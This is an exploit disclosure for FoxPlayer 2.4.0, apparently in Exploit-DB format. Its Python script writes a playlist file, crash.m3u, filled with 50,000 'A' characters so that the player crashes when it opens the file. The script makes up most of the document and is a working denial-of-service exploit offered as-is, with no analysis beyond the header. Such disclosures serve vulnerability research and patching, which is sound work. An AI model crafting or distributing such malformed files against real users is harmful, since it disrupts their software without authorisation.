# Exploit Title: FoxPlayer 2.4.0 (.m3u) Denial of Service
# Date: 30 / 11 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.foxmediatools.com/installers/fox-player-setup.exe
# Version: v2.4.0
# Tested on: Windows XP SP 2
# CVE : N / A
# Description : This is the latest version of FoxPlayer from the official website.. The version is v2.4.0

#!/usr/bin/python

filename = "crash.m3u"

junk = "\x41" * 50000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()